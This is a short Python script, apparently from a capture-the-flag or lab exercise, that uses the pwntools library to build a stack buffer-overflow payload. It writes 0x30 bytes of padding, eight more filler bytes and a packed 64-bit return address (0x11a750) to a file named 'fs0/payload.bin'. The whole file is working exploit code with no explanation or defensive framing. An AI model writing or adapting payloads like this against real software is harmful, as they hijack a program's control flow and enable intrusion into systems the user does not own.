from pwn import *

offset = 0x30
addr = 0x11a750

with open('fs0/payload.bin', 'wb') as f:
    f.write(offset * b'A' + 8 * b'A' + p64(addr))
